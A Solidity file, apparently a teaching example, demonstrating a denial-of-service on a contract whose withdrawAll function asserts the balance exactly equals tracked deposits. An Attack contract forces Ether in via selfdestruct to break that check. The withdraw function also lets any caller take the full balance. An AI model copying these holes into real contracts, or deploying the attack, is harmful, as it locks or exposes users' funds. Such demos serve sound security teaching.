// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/// @title Strict-Equality - An example of how strict equality can be used to exploit a contract.
/// @notice This contract shows how strict equality can be used to exploit a contract by causing a denial of service attack, also know and gridlock.
/// @dev This example is for educational purposes only and should not be used for production code without an appropriate security audit.
/// @author Jason Schwarz (https://jasonschwarz.xyz)

contract VulnerableContract {
  
    uint256 private totalDeposited;

    function deposit() external payable {
        require(msg.value > 0, "Deposit amount must be greater than zero");
        
        totalDeposited += msg.value;
    }

    // Function to withdraw Ether from the contract
    function withdrawAll() external {
        assert(address(this).balance == totalDeposited);

        totalDeposited = 0;    
        payable(msg.sender).transfer(address(this).balance);
    }

   
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getTotalDeposited() external view returns (uint256) {
        return totalDeposited;
    }
}

contract Attack {
    VulnerableContract public target;

    constructor(address _target) {
        target = VulnerableContract(_target);
    }

    receive() external payable { }

    // Send Ether directly to the Target contract
    function attack() external payable {
        selfdestruct(payable(address(target)));
    }
}
